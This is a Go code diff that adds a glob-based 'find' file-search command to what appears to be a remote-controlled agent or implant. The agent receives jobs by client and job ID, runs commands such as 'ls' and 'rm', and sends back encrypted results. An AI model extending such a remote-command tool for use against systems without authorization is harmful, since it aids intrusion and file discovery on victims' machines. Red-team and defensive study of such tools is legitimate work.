@@ -21,6 +21,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
@@ -1088,7 +1089,31 @@ func ls(location string) string { // Lists the files in the given directory
 			dir = "   <DIR>    "
 		}
 		result = result + spacePad(ts, "ts") + dir + spacePad(size, "size") + "     " + f.Name() + "\n"
+	}
+	return result
+}
 
+func find(glob string) string { // Searches the current directory for the glob
+	filenames, err := filepath.Glob(glob)
+	if err != nil {
+		return "Invalid glob pattern."
+	}
+	var result string
+	for _, filename := range filenames {
+		f, err := os.Stat(filename)
+		if err != nil {
+			// If we can't stat the file for some reason, don't prevent other results from being returned
+			result = result + spacePad("n/a", "ts") + "   <ERR>    " + spacePad("n/a", "size") + "     " + filename + "\n"
+			continue
+		}
+		size := ByteCountDecimal(f.Size())
+		timestamp := f.ModTime()
+		ts := timestamp.Format("01/02/2006 3:04:05 PM MST")
+		dir := "            "
+		if f.IsDir() {
+			dir = "   <DIR>    "
+		}
+		result = result + spacePad(ts, "ts") + dir + spacePad(size, "size") + "     " + f.Name() + "\n"
 	}
 	return result
 }
@@ -1830,6 +1855,11 @@ func RunCommand(client_id, job_id, command string) { //This receives a command t
 		case "ls":
 			ls := ls(args[1])
 			encryptedOutput, _ := Encrypt([]byte(ls))
+			SendResult(client_id, job_id, "output", encryptedOutput)
+
+		case "find":
+			find := find(args[1])
+			encryptedOutput, _ := Encrypt([]byte(find))
 			SendResult(client_id, job_id, "output", encryptedOutput)
 
 		case "rm":
